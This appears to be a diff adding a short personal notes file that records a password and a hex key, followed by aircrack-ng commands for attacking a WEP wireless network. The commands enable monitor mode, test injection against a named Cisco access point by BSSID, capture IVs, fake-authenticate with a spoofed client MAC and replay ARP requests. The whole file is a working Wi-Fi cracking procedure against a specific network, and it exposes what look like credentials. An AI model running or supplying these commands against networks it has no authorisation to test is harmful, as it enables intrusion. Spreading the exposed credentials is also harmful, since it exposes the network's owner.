@@ -1,0 +1,24 @@
+Passowrd : bitshyd@123
+key : 855F3B1A15
+
+sudo airmon-ng stop mon0
+sudo airmon-ng start wlp2s0 9
+
+sudo ifconfig wlp2s0 down
+sudo iwconfig wlp2s0 mode monitor
+sudo ifconfig wlp2s0 up
+
+
+sudo aireplay-ng -9 mon0
+
+sudo aireplay-ng -9 -e Cisco00334 -a 20:AA:4B:55:6E:49  mon0 // TO check device injection
+
+sudo airodump-ng -c 9 --bssid 20:AA:4B:55:6E:49 -w output mon0  // To capture the IV's
+
+sudo aireplay-ng -1 0 -e Cisco00334 -a 20:AA:4B:55:6E:49 -h 3c:95:09:55:81:07 mon0 // Todo fake authentication
+
+sudo aireplay-ng -3 -b 20:AA:4B:55:6E:49 -h 3c:95:09:55:81:07 mon0 // listens for ARP requests then reinjects them back into the network
+
+
+
+
